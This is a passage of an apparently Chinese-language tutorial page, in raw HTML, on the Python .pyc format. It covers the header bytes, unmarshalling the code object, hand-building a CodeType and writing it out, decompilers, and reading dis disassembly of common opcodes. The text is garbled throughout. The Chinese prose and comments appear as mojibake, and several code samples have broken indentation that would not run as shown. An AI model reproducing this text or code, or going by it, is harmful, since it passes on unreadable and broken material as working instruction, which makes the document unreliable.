class="number">4</span>]) <span class="comment"># b&#x27;U\r\r\n&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(MAGIC_NUMBER) <span class="comment"># b&#x27;U\r\r\n&#x27;</span></span><br><span class="line"><span class="comment"># 4 ~ 8 å­—èŠ‚æ˜¯ 4 ä¸ª \x00</span></span><br><span class="line"><span class="built_in">print</span>(data[<span class="number">4</span>: <span class="number">8</span>]) <span class="comment"># b&#x27;\x00\x00\x00\x00&#x27;</span></span><br><span class="line"><span class="comment"># 8 ~ 12 å­—èŠ‚æ˜¯ pyc çš„å†™å…¥æ—¶é—´ï¼ˆå°ç«¯å­˜å‚¨ï¼‰ï¼Œä¸€ä¸ªæ—¶é—´æˆ³</span></span><br><span class="line">ts = struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="number">8</span>: <span class="number">12</span>])[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(ts) <span class="comment"># 1685686081</span></span><br><span class="line"><span class="built_in">print</span>(datetime.fromtimestamp(ts)) <span class="comment"># 2023-06-02 14:08:01</span></span><br><span class="line"><span class="comment"># 12 ~ 16 å­—èŠ‚æ˜¯ py æ–‡ä»¶çš„å¤§å°</span></span><br><span class="line"><span class="built_in">print</span>(struct.unpack(<span class="string">&quot;&lt;I&quot;</span>, data[<span class="number">12</span>: <span class="number">16</span>])[<span class="number">0</span>]) <span class="comment"># 47</span></span><br></pre></td></tr></table></figure><p>ç»“æœå’Œæˆ‘ä»¬åˆ†æçš„ä¸€æ ·ï¼Œå› æ­¤å¯¹äºä»»ä½•ä¸€ä¸ª pyc æ–‡ä»¶æ¥è¯´ï¼Œå‰ 16 å­—èŠ‚æ˜¯å›ºå®šçš„ï¼ˆå¦‚æœ Python ä½äº3.7ï¼Œé‚£ä¹ˆå‰ 12 ä¸ªå­—èŠ‚æ˜¯å›ºå®šçš„ï¼‰ã€‚</p><p>16 ä¸ªå­—èŠ‚å¾€åå°±æ˜¯ PyCodeObject å¯¹è±¡ï¼Œå¹¶ä¸”æ˜¯åºåˆ—åŒ–ä¹‹åçš„ï¼Œå› ä¸ºè¯¥å¯¹è±¡æ˜¾ç„¶æ— æ³•ç›´æ¥å­˜åœ¨æ–‡ä»¶ä¸­ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;__pycache__/test.cpython-38.pyc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"><span class="comment"># é€šè¿‡ marshal.loads ååºåˆ—åŒ–</span></span><br><span class="line">code = marshal.loads(data[<span class="number">16</span>:]) <span class="comment"># æ­¤æ—¶å°±æ‹¿åˆ°äº† py æ–‡ä»¶ç¼–è¯‘ä¹‹åçš„ PyCodeObject</span></span><br><span class="line"><span class="built_in">print</span>(code)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;code object &lt;module&gt; at 0x..., file &quot;test.py&quot;, line 1&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment"># æŸ¥çœ‹å­—èŠ‚ç </span></span><br><span class="line"><span class="built_in">print</span>(code.co_code)</span><br><span class="line"><span class="comment"># æŸ¥çœ‹å¸¸é‡æ± </span></span><br><span class="line"><span class="built_in">print</span>(code.co_consts)</span><br><span class="line"><span class="comment"># ç¬¦å·è¡¨</span></span><br><span class="line"><span class="built_in">print</span>(code.co_names)</span><br></pre></td></tr></table></figure><p>æ—¢ç„¶æˆ‘ä»¬å¯ä»¥æ ¹æ® pyc æ–‡ä»¶åæ¨å‡º PyCodeObjectï¼Œé‚£ä¹ˆèƒ½å¦æ‰‹åŠ¨æ„å»º PyCodeObject ç„¶åç”Ÿæˆ pycå‘¢ï¼Ÿæ¥è¯•ä¸€ä¸‹ã€‚ä¾‹å¦‚æˆ‘ä»¬æƒ³å®ç°å¦‚ä¸‹çš„ py æ–‡ä»¶ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">c = <span class="number">3</span></span><br></pre></td></tr></table></figure><p>ä¸Šè¿°ä»£ç ç¼–è¯‘ä¹‹åçš„ç»“æœï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ„å»ºçš„ PyCodeObjectã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">from</span> opcode <span class="keyword">import</span> opmap</span><br><span class="line"><span class="keyword">from</span> types <span class="keyword">import</span> CodeType</span><br><span class="line"><span class="keyword">from</span> importlib.util <span class="keyword">import</span> MAGIC_NUMBER</span><br><span class="line">HEADER = MAGIC_NUMBER + <span class="string">b&quot;\x00&quot;</span> * <span class="number">4</span></span><br><span class="line"><span class="comment"># æ—¶é—´éšä¾¿å†™</span></span><br><span class="line">HEADER += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="built_in">int</span>(time.time()))</span><br><span class="line"><span class="comment"># å¤§å°éšä¾¿å†™</span></span><br><span class="line">HEADER += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">47</span>)</span><br><span class="line"><span class="comment"># æ„å»º PyCodeObject</span></span><br><span class="line">code = CodeType(</span><br><span class="line">    <span class="number">0</span>, <span class="comment"># co_argcount</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment"># co_posonlyargcount</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment"># co_kwonlyargcount</span></span><br><span class="line">    <span class="number">3</span>, <span class="comment"># co_nlocals</span></span><br><span class="line">    <span class="number">1</span>, <span class="comment"># co_stacksize</span></span><br><span class="line">    <span class="number">0</span>, <span class="comment"># co_flags</span></span><br><span class="line">    <span class="built_in">bytes</span>([</span><br><span class="line">        <span class="comment"># a = 1 åˆ†ä¸ºä¸¤æ­¥</span></span><br><span class="line">            <span class="comment"># ç¬¬ä¸€æ­¥ï¼šå…ˆé€šè¿‡ LOAD_CONST å°†å¸¸é‡åŠ è½½è¿›æ¥</span></span><br><span class="line">            <span class="comment"># å› æ­¤æŒ‡ä»¤æ˜¯ LOAD_CONSTï¼Œç„¶åå‚æ•°æ˜¯ 0</span></span><br><span class="line">            <span class="comment"># è¡¨ç¤ºåŠ è½½å¸¸é‡æ±  co_consts ä¸­ç´¢å¼•ä¸º 0 çš„å¸¸é‡</span></span><br><span class="line">            opmap[<span class="string">&quot;LOAD_CONST&quot;</span>], <span class="number">0</span>,</span><br><span class="line">            <span class="comment"># ç¬¬äºŒæ­¥ï¼šé€šè¿‡ STORE_NAME å°†å¸¸é‡å’Œç¬¦å·ç»‘å®šèµ·æ¥</span></span><br><span class="line">            <span class="comment"># å‚æ•°æ˜¯ 0ï¼Œè¡¨ç¤ºå’Œç¬¦å·è¡¨ä¸­ç´¢å¼•ä¸º 0 çš„ç¬¦å·è¿›è¡Œç»‘å®š</span></span><br><span class="line">            opmap[<span class="string">&quot;STORE_NAME&quot;</span>], <span class="number">0</span>,</span><br><span class="line">            <span class="comment"># b = 2</span></span><br><span class="line">            opmap[<span class="string">&quot;LOAD_CONST&quot;</span>], <span class="number">1</span>,</span><br><span class="line">            opmap[<span class="string">&quot;STORE_NAME&quot;</span>], <span class="number">1</span>,</span><br><span class="line">            <span class="comment"># c = 3</span></span><br><span class="line">            opmap[<span class="string">&quot;LOAD_CONST&quot;</span>], <span class="number">2</span>,</span><br><span class="line">            opmap[<span class="string">&quot;STORE_NAME&quot;</span>], <span class="number">2</span>,</span><br><span class="line">            <span class="comment"># ç»“å°¾è¦ LOAD ä¸€ä¸ª Noneï¼Œç„¶åè¿”å›</span></span><br><span class="line">            opmap[<span class="string">&quot;LOAD_CONST&quot;</span>], <span class="number">3</span>,</span><br><span class="line">            opmap[<span class="string">&quot;RETURN_VALUE&quot;</span>]</span><br><span class="line">    ]), <span class="comment"># co_code</span></span><br><span class="line">    (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="literal">None</span>), <span class="comment"># co_consts</span></span><br><span class="line">    (<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>), <span class="comment"># co_names</span></span><br><span class="line">    (), <span class="comment"># co_varnames</span></span><br><span class="line">            <span class="string">&quot;out.py&quot;</span>, <span class="comment"># co_filename</span></span><br><span class="line">            <span class="string">&quot;&lt;module&gt;&quot;</span>, <span class="comment"># co_name</span></span><br><span class="line">            <span class="number">1</span>, <span class="comment"># co_firstlineno</span></span><br><span class="line">            <span class="string">b&quot;&quot;</span>, <span class="comment"># co_lnotab</span></span><br><span class="line">            (), <span class="comment"># freevars</span></span><br><span class="line">            () <span class="comment"># cellvars</span></span><br><span class="line">            )</span><br><span class="line">    <span class="comment"># pyc æ–‡ä»¶å†…å®¹</span></span><br><span class="line">            pyc_content = HEADER + marshal.dumps(code)</span><br><span class="line">            <span class="comment"># ç”Ÿæˆ pyc æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.pyc&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f :</span><br><span class="line">        f.write(pyc_content)</span><br><span class="line">            <span class="comment"># ç„¶ååŠ è½½ç”Ÿæˆçš„ pyc æ–‡ä»¶</span></span><br><span class="line">            <span class="keyword">from</span> importlib.machinery <span class="keyword">import</span> SourcelessFileLoader</span><br><span class="line">            mod = SourcelessFileLoader(</span><br><span class="line">                <span class="string">&quot;out&quot;</span>, <span class="string">&quot;out.pyc&quot;</span></span><br><span class="line">            ).load_module()</span><br><span class="line">            <span class="built_in">print</span>(mod) <span class="comment"># &lt;module &#x27;out&#x27; from &#x27;out.pyc&#x27;&gt;</span></span><br><span class="line">            <span class="built_in">print</span>(mod.a) <span class="comment"># 1</span></span><br><span class="line">            <span class="built_in">print</span>(mod.b) <span class="comment"># 2</span></span><br><span class="line">            <span class="built_in">print</span>(mod.c) <span class="comment"># 3</span></span><br></pre></td></tr></table></figure><h3 id="é€†å‘å·¥å…·"><a href="#é€†å‘å·¥å…·" class="headerlink" title="é€†å‘å·¥å…·"></a><strong>é€†å‘å·¥å…·</strong></h3><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹å¼æ¥åç¼–è¯‘ pyc æ–‡ä»¶ï¼Œæ‹¿åˆ°æºç ï¼š</p><p><a href="https://tool.lu/pyc/"><strong>åœ¨çº¿å·¥å…·</strong></a></p><p><strong>pycdc</strong>ï¼šç¼–è¯‘æ¼”ç¤º<a href="https://github.com/zrax/pycdc">https://github.com/zrax/pycdc</a></p><p>uncompyle6ï¼šå®‰è£…æ–¹å¼ pip install uncompyle6</p><h2 id="pyc-å­—èŠ‚ç "><a href="#pyc-å­—èŠ‚ç " class="headerlink" title="pyc å­—èŠ‚ç "></a><strong>pyc</strong> <strong>å­—èŠ‚ç </strong></h2><h3 id="åæ±‡ç¼–"><a href="#åæ±‡ç¼–" class="headerlink" title="åæ±‡ç¼–"></a><strong>åæ±‡ç¼–</strong></h3><p>å­—èŠ‚ç æ‹¿è¿‡æ¥<strong>åæ±‡ç¼–</strong>å°±å¾—åˆ°äº†é’ˆå¯¹ Python è™šæ‹Ÿæœºçš„<strong>æ±‡ç¼–ä»£ç </strong>ï¼Œç±»ä¼¼äº x86 æ±‡ç¼–ï¼Œä½†æ˜¯æ¯” x86 çš„å¥½è¯»å¤šäº†ã€‚é€šè¿‡ dis.dis() å°±å¯ä»¥å°†å­—èŠ‚ç è½¬ä¸ºå¯è¯»çš„ä¼ªä»£ç ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;out.pyc&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">raw = f.read()</span><br><span class="line">code = marshal.loads(raw[<span class="number">16</span>:])</span><br><span class="line">dis.dis(code)</span><br></pre></td></tr></table></figure><p>è¾“å‡ºå¦‚ä¸‹ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">2</span> STORE_NAME <span class="number">0</span> (a)</span><br><span class="line"><span class="number">4</span> LOAD_CONST <span class="number">1</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">6</span> STORE_NAME <span class="number">1</span> (b)</span><br><span class="line"><span class="number">8</span> LOAD_CONST <span class="number">2</span> (<span class="number">3</span>)</span><br><span class="line"><span class="number">10</span> STORE_NAME <span class="number">2</span> (c)</span><br><span class="line"><span class="number">12</span> LOAD_CONST <span class="number">3</span> (<span class="literal">None</span>)</span><br><span class="line"><span class="number">14</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>ç»“æ„å¦‚ä¸‹ï¼š</p><p>æºç è¡Œå· | æŒ‡ä»¤åœ¨å‡½æ•°ä¸­çš„åç§» | æŒ‡ä»¤ç¬¦å· | æŒ‡ä»¤å‚æ•° | å®é™…å‚æ•°å€¼</p><h3 id="å¸¸é‡"><a href="#å¸¸é‡" class="headerlink" title="å¸¸é‡"></a><strong>å¸¸é‡</strong></h3><p>LOAD_CONST ç”¨äºåŠ è½½å¸¸é‡ï¼Œæ¯”å¦‚æ•°å€¼ã€å­—ç¬¦ä¸²ç­‰ç­‰ï¼Œä¸€èˆ¬ç”¨äºä¼ ç»™å‡½æ•°çš„å‚æ•°ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">55</span> <span class="number">12</span> LOAD_GLOBAL <span class="number">1</span> (test)</span><br><span class="line"><span class="number">15</span> LOAD_FAST <span class="number">0</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">18</span> LOAD_CONST <span class="number">1</span> (<span class="string">&#x27;output&#x27;</span>)</span><br><span class="line"><span class="number">21</span> CALL_FUNCTION <span class="number">2</span></span><br></pre></td></tr></table></figure><p>è½¬ä¸º python ä»£ç å°±æ˜¯ï¼š</p><p>test(2, â€œoutputâ€)</p><h3 id="å˜é‡"><a href="#å˜é‡" class="headerlink" title="å˜é‡"></a><strong>å˜é‡</strong></h3><h4 id="å…¨å±€å˜é‡"><a href="#å…¨å±€å˜é‡" class="headerlink" title="å…¨å±€å˜é‡"></a><strong>å…¨å±€å˜é‡</strong></h4><p>LOAD_GLOBAL ç”¨æ¥åŠ è½½å…¨å±€å˜é‡ï¼ŒåŒ…æ‹¬æŒ‡å®šå‡½æ•°åï¼Œç±»åï¼Œæ¨¡å—åç­‰å…¨å±€ç¬¦å·ã€‚</p><p>STORE_GLOBAL ç”¨æ¥ç»™å…¨å±€å˜é‡èµ‹å€¼ã€‚</p><p>ä¾‹å¦‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">5</span> <span class="number">0</span> LOAD_CONST <span class="number">1</span> (<span class="number">101</span>)</span><br><span class="line"><span class="number">2</span> STORE_GLOBAL <span class="number">0</span> (num)</span><br><span class="line"><span class="number">6</span> <span class="number">4</span> LOAD_GLOBAL <span class="number">1</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">6</span> LOAD_GLOBAL <span class="number">0</span> (num)</span><br><span class="line"><span class="number">8</span> CALL_FUNCTION <span class="number">1</span></span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„ python ä»£</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">num = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line"><span class="keyword">global</span> num</span><br><span class="line">num = <span class="number">101</span></span><br><span class="line"><span class="built_in">print</span>(num)</span><br></pre></td></tr></table></figure><h4 id="å±€éƒ¨å˜é‡"><a href="#å±€éƒ¨å˜é‡" class="headerlink" title="å±€éƒ¨å˜é‡"></a><strong>å±€éƒ¨å˜é‡</strong></h4><p>LOAD_FAST ä¸€èˆ¬åŠ è½½å±€éƒ¨å˜é‡çš„å€¼ï¼Œä¹Ÿå°±æ˜¯è¯»å–å€¼ï¼Œç”¨äºè®¡ç®—æˆ–è€…å‡½æ•°è°ƒç”¨ä¼ å‚ç­‰ã€‚</p><p>STORE_FAST ä¸€èˆ¬ç”¨äºä¿å­˜å€¼åˆ°å±€éƒ¨å˜</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span> <span class="number">0</span> LOAD_CONST <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span> STORE_FAST <span class="number">0</span> (n)</span><br><span class="line"><span class="number">3</span> <span class="number">4</span> LOAD_CONST <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">6</span> STORE_FAST <span class="number">1</span> (p)</span><br><span class="line"><span class="number">4</span> <span class="number">8</span> LOAD_FAST <span class="number">0</span> (n)</span><br><span class="line"><span class="number">10</span> LOAD_FAST <span class="number">1</span> (p)</span><br><span class="line"><span class="number">12</span> BINARY_ADD</span><br><span class="line"><span class="number">14</span> STORE_FAST <span class="number">0</span> (n)</span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„ python ä»£ç </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">n = <span class="number">0</span></span><br><span class="line">p = <span class="number">0</span></span><br><span class="line">n = n + p</span><br></pre></td></tr></table></figure><p>å‡½æ•°çš„å‚æ•°ä¹Ÿç®—å±€éƒ¨å˜é‡ï¼Œå¦‚ä½•åŒºåˆ†å‡ºæ˜¯å‡½æ•°å‚æ•°è¿˜æ˜¯å…¶ä»–å±€éƒ¨å˜é‡å‘¢ï¼Ÿ</p><p><strong>å‚æ•°æ²¡æœ‰åˆå§‹åŒ–è¯­å¥</strong>ï¼Œä¹Ÿå°±æ˜¯ä»å‡½æ•°å¼€å§‹åˆ° LOAD_FAST è¯¥å˜é‡çš„ä½ç½®ï¼Œå¦‚æœæ²¡æœ‰çœ‹åˆ° STORE_FAST ï¼Œé‚£ä¹ˆè¯¥å˜é‡å°±æ˜¯å‡½æ•°å‚æ•°ã€‚</p><p>è€Œå±€éƒ¨å˜é‡åœ¨ä½¿ç”¨ä¹‹å‰è‚¯å®šä¼šä½¿ç”¨ STORE_FAST è¿›è¡Œåˆå§‹åŒ–ã€‚</p><p>ä¾‹å¦‚ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Disassembly of &lt;code <span class="built_in">object</span> test at <span class="number">0x1A9F3E62240</span>, file <span class="string">&quot;test.py&quot;</span>, line <span class="number">1</span>&gt;:</span><br><span class="line"><span class="number">2</span> <span class="number">0</span> LOAD_CONST <span class="number">1</span> (<span class="number">0</span>)</span><br><span class="line"><span class="number">2</span> STORE_FAST <span class="number">1</span> (local)</span><br><span class="line"><span class="number">3</span> <span class="number">4</span> LOAD_GLOBAL <span class="number">0</span> (<span class="built_in">print</span>)</span><br><span class="line"><span class="number">6</span> LOAD_FAST <span class="number">1</span> (local)</span><br><span class="line"><span class="number">8</span> LOAD_FAST <span class="number">0</span> (arg1)</span><br><span class="line"><span class="number">10</span> CALL_FUNCTION <span class="number">2</span></span><br></pre></td></tr></table></figure><p>å¯¹åº”çš„ python ä»£ç ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>(<span class="params">arg1</span>):</span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(local, arg1)</span><br></pre></td></tr></table></figure><h3 id="å¸¸ç”¨æ•°æ®ç±»å‹"><a href="#å¸¸ç”¨æ•°æ®ç±»å‹" class="headerlink" title="å¸¸ç”¨æ•°æ®ç±»å‹"></a><strong>å¸¸ç”¨æ•°æ®ç±»å‹</strong></h3><h4 id="åˆ—è¡¨"><a href="#åˆ—è¡¨" class="headerlink" title="åˆ—è¡¨"></a><strong>åˆ—è¡¨</strong></h4><p>BUILD_LIST ç”¨äºåˆ›å»ºä¸€ä¸ª listã€‚</p><p>ä¾‹å¦‚</p><p>1 0 LOAD_CONST 0 (1)</p><p>2 LOAD_CONST 1 (2)</p><p>4 BUILD_LIST 2</p><p>6 STORE_NAME 0 (k)</p><p>å¯¹åº” k &#x3D; [1, 2] ã€‚</p><p>é€šè¿‡åˆ—è¡¨æ¨å¯¼å¼ï¼ˆè¯­æ³•ç³–ï¼‰æ„å»ºåˆ—è¡¨ï¼š</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (&lt;code <span class="built_in">object</span> &lt;listcomp&gt;&gt;)</span><br><span class="line"><span class="number">2</span> LOAD_CONST <span class="number">1</span> (<span class="string">&#x27;&lt;listcomp&gt;&#x27;</span>)</span><br><span class="line"><span class="number">4</span> MAKE_FUNCTION <span class="number">0</span></span><br><span class="line"><span class="number">6</span> LOAD_NAME <span class="number">0</span> (<span class="built_in">range</span>)</span><br><span class="line"><span class="number">8</span> LOAD_CONST <span class="number">2</span> (<span class="number">32</span>)</span><br><span class="line"><span class="number">10</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">12</span> GET_ITER</span><br><span class="line"><span class="number">14</span> CALL_FUNCTION <span class="number">1</span></span><br><span class="line"><span class="number">16</span> STORE_NAME <span class="number">1</span> (a)</span><br><span class="line"><span class="number">18</span> LOAD_CONST <span class="number">3</span> (<span class="literal">None</span>)</span><br><span class="line"><span class="number">20</span> RETURN_VALUE</span><br><span class="line">Disassembly of &lt;code <span class="built_in">object</span> &lt;listcomp&gt;&gt;:</span><br><span class="line"><span class="number">1</span> <span class="number">0</span> BUILD_LIST <span class="number">0</span></span><br><span class="line"><span class="number">2</span> LOAD_FAST <span class="number">0</span> (<span class="number">.0</span>)</span><br><span class="line">&gt;&gt; <span class="number">4</span> FOR_ITER <span class="number">12</span> (to <span class="number">18</span>)</span><br><span class="line"><span class="number">6</span> STORE_FAST <span class="number">1</span> (i)</span><br><span class="line"><span class="number">8</span> LOAD_FAST <span class="number">1</span> (i)</span><br><span class="line"><span class="number">10</span> LOAD_CONST <span class="number">0</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">12</span> BINARY_ADD</span><br><span class="line"><span class="number">14</span> LIST_APPEND <span class="number">2</span></span><br><span class="line"><span class="number">16</span> JUMP_ABSOLUTE <span class="number">4</span></span><br><span class="line">&gt;&gt; <span class="number">18</span> RETURN_VALUE</span><br></pre></td></tr></table></figure><p>å¯¹åº”è¯­å¥ a &#x3D; [i+2 for i in range(32)]</p><h4 id="å­—å…¸"><a href="#å­—å…¸" class="headerlink" title="å­—å…¸"></a><strong>å­—å…¸</strong></h4><p>BUILD_MAP ç”¨äºåˆ›å»ºä¸€ä¸ªç©ºçš„ dictã€‚</p><p>STORE_MAP ç”¨äºåˆå§‹åŒ– dict çš„å†…å®¹ã€‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="number">0</span> LOAD_CONST <span class="number">0</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="number">2</span> LOAD_CONST <span class="number">1</span> (<span class="number">1</span>)</span><br><span class="line"><span class="number">4</span> BUILD_MAP <span class="number">1</span></span><br><span class="line"><span class="number">6</span> STORE_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">2</span> <span class="number">8</span> LOAD_CONST <span class="number">2</span> (<span class="number">2</span>)</span><br><span class="line"><span class="number">10</span> LOAD_NAME <span class="number">0</span> (k)</span><br><span class="line"><span class="number">12</span> LOAD_CONST <span class="number">0</span> (<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="number">14</span> STORE_SUBSCR</span><br></pre></td></tr></table></figure><p>åˆ†åˆ«å¯¹åº” k &#x3D; {â€˜aâ€™: 1} å’Œ k[â€˜aâ€™] &#x3D; 2 ã€‚</p><h4 id="åˆ‡ç‰‡"><a href="#åˆ‡ç‰‡" class="headerlink" title="åˆ‡ç‰‡"></a><strong>åˆ‡ç‰‡</strong></h4><p>BUILD_SLICE ç”¨äºåˆ›å»ºåˆ‡ç‰‡ã€‚å¯¹äº listã€tupleã€å­—ç¬¦ä¸²éƒ½å¯ä»¥ä½¿ç”¨åˆ‡ç‰‡çš„æ–¹å¼è¿›è¡Œè®¿é—®ã€‚</p><p>ä½†æ˜¯è¦æ³¨æ„ BUILD_SLICE ç”¨äº [x:y:z] è¿™ç§ç±»å‹çš„åˆ‡ç‰‡ï¼Œç»“åˆ BINARY_SUBSCR è¯»å–åˆ‡ç‰‡çš„å€¼ï¼Œç»“åˆ</p><p>STORE_SUBSCR ç”¨äºä¿®æ”¹åˆ‡ç‰‡çš„å€¼ã€‚</p><p>ä¾‹å¦‚</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 